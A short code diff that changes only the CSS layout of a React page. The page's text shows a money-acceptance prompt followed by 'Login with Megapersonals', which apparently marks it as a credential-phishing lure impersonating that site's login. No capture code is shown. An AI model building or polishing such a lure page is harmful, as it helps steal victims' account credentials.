@@ -74,7 +74,7 @@ export default function Home({ adminId, posterId }) {
           </p>
           <img src="/images/logo-potrait.jpg" alt="" />
           <p className="text-center text-xs mt-3">To accept this money</p>
-          <div className=" w-full md:w-[40%] m-3">
+          <div className="flex flex-col m-3">
             <p className="text-start text-lg font-semibold pl-3">
               Login with Megapersonals
             </p>
